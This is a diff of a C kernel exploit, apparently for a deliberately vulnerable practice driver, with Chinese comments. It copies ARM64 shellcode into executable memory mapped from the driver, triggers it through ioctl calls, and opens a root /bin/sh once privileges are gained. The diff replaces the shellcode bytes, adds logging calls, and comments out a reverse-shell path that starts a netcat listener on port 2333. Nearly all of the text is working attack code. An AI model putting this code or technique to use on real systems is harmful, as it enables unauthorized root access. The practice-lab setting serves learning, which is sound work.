@@ -21,7 +21,9 @@
 #include <linux/if_arp.h>
 #include <linux/fb.h> 
 
-#include "vuln_driver.h"
+#include "vulnerable_driver/src/vuln_driver.h"
+
+#include "selflog.h"
 
 #define BUFF_SIZE 96
 
@@ -113,6 +115,7 @@ int mainuser()
 	// 拷贝stub代码到 MMAP_ADDR
 	memcpy(fn,stub,128);
 	int fd=open(PATH,O_RDWR);
+
 	//用于标识dmesg中字符串的开始
 	ioctl(fd,DRIVER_TEST,NULL);
 	/*
@@ -151,7 +154,7 @@ int main()
 int fd; 
 int i; 
 unsigned long *p_map;
-char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x9a\x92\xa1\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xff\x9a\x92\xa1\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6"; 
+char shellcode[]="\xfd\x7b\xbd\xa9\xfd\x03\x00\x91\xe0\x53\x98\x92\xc0\x01\xa0\xf2\x00\x00\xd0\xf2\xa0\x0b\x00\xf9\xe0\xf0\x98\x92\xc0\x01\xa0\xf2\x00\x00\xd0\xf2\xa0\x0f\x00\xf9\xa0\x0b\x40\xf9\xa0\x13\x00\xf9\xa0\x0f\x40\xf9\xa0\x17\x00\xf9\xa1\x13\x40\xf9\x00\x00\x80\x52\x20\x00\x3f\xd6\xa1\x17\x40\xf9\x20\x00\x3f\xd6\x1f\x20\x03\xd5\xfd\x7b\xc3\xa8\xc0\x03\x5f\xd6"; 
 
 char shellcodereverse[]=
 "\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
@@ -170,7 +173,7 @@ if(fd < 0)
 printf("open fail\n"); 
 exit(1); 
 } 
- 
+ioctl(fd,INIT_KLOG,NULL);
 //内存映射 
 p_map = (unsigned char *)mmap(0, PAGE_SIZE,  PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED,fd, 0); 
 if(p_map == MAP_FAILED) 
@@ -194,9 +197,10 @@ printf("fn  address: %p  value: %p \n",&fn,fn);
 printf("p_map  address: %p  value: %p \n",&p_map,p_map);
 ioctl(fd,DRIVER_MAP,NULL);
 //memcpy(fn,get_root,128);
-memcpy(fn,shellcodereverse,sizeof(shellcodereverse));
+memcpy(fn,shellcode,sizeof(shellcode));
 ioctl(fd,DRIVER_MAP,NULL);
-//ioctl(fd,DRIVER_MAP_SHOW,NULL);
+get_log(fd);
+ioctl(fd,DRIVER_MAP_SHOW,NULL);
 
 if (getuid()==0)
 {
@@ -204,16 +208,16 @@ if (getuid()==0)
 	system("/bin/sh");
 }
 //需要fork()子线程来执行reverse_shell程序
-if (fork()==0){
-	ioctl(fd,DRIVER_MAP_SHOW,NULL);
-	exit(1);
-}
-system("nc -l -p 2333");
-if (getuid()==0)
-{
-	printf("[+] Congratulations! You get root shell !!! [+]\n");
-	system("/bin/sh");
-}
+// if (fork()==0){
+// 	ioctl(fd,DRIVER_MAP_SHOW,NULL);
+// 	exit(1);
+// }
+// system("nc -l -p 2333");
+// if (getuid()==0)
+// {
+// 	printf("[+] Congratulations! You get root shell !!! [+]\n");
+// 	system("/bin/sh");
+// }
 here: 
 munmap(p_map, PAGE_SIZE); 
 return 0; 
